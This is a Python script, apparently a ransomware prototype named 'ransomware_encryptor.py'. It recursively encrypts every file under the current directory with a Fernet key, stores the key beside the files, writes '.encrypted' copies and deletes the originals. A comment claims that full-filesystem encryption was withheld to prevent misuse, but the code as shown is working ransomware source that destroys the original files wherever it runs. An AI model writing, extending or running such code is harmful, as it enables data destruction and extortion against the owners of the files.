# This program encrypts the files and folders in the current directory
# In order to prevent misuse, I did not implement the code to encrypt the entire file system

import os
from cryptography.fernet import Fernet

file_list = list()

def list_all_files(directory):
    exclude_files = {'secret.key', 'ransomware_encryptor.py'}  # Set of filenames to exclude
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file in exclude_files:
                continue
            file_list.append(os.path.join(root, file))
            
def generate_key(key_file='secret.key'):
    """
    Generates a new Fernet key and saves it into a file.
    """
    key = Fernet.generate_key()
    with open(key_file, 'wb') as f:
        f.write(key)
    return key
    
def load_key(key_file='secret.key'):
    """
    Loads the Fernet key from the specified file.
    """
    with open(key_file, 'rb') as f:
        return f.read() 
        
def encrypt_file(file_path, key):
    """
    Encrypts the contents of file_path and writes the encrypted data
    to a new file with '.encrypted' appended to the original file name.
    """
    fernet = Fernet(key)
    
    # Read the original file data
    with open(file_path, 'rb') as file:
        original_data = file.read()

    # Encrypt the data
    encrypted_data = fernet.encrypt(original_data)
    
    # Write the encrypted data to a new file
    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as enc_file:
        enc_file.write(encrypted_data)
    
    print(f'File encrypted and saved as: {encrypted_file_path}') 
    
def delete_unecrypted_files():
    for file in file_list:
    # Check if the file exists before attempting to delete it
        if os.path.exists(file):
            os.remove(file)
            print(f"Deleted: {file}")
        else:
            print(f"File not found: {file}")                         

if __name__ == '__main__':
    # Uncomment the following line if you need to generate a new key:
    key = generate_key()
    
    # Specify the file you want to encrypt
    list_all_files(".")
    print(file_list)
    
    for current_file in file_list:
        file_to_encrypt = current_file
        encrypt_file(file_to_encrypt, key)
        
    delete_unecrypted_files()



